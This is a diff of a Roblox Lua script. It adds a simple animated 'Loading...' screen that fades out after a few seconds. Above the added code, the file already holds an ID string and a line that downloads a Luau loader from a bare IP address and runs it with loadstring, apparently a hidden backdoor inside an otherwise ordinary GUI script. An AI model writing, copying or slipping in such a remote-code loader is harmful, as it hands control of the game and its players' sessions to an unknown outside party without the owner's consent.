@@ -1,2 +1,33 @@
 ID="7e6d4aff-347a-49f8-a332-069ebef70997";
 loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))()
+
+-- LocalScript inside LoadingGui
+local player = game.Players.LocalPlayer
+local loadingGui = script.Parent
+local frame = loadingGui:WaitForChild("Frame")
+local label = frame:WaitForChild("TextLabel")
+
+-- Animate the text "Loading..."
+local dots = 0
+local runService = game:GetService("RunService")
+
+-- Update loading dots while waiting
+local connection
+connection = runService.RenderStepped:Connect(function()
+	dots = (dots + 1) % 4
+	label.Text = "Loading" .. string.rep(".", dots)
+	wait(0.5)
+end)
+
+-- Simulate game loading
+-- Replace with actual check if needed
+task.wait(5) -- wait 5 seconds for demo
+
+-- Fade out and remove
+connection:Disconnect()
+for i = 1, 20 do
+	frame.BackgroundTransparency = i/20
+	label.TextTransparency = i/20
+	task.wait(0.05)
+end
+loadingGui:Destroy()
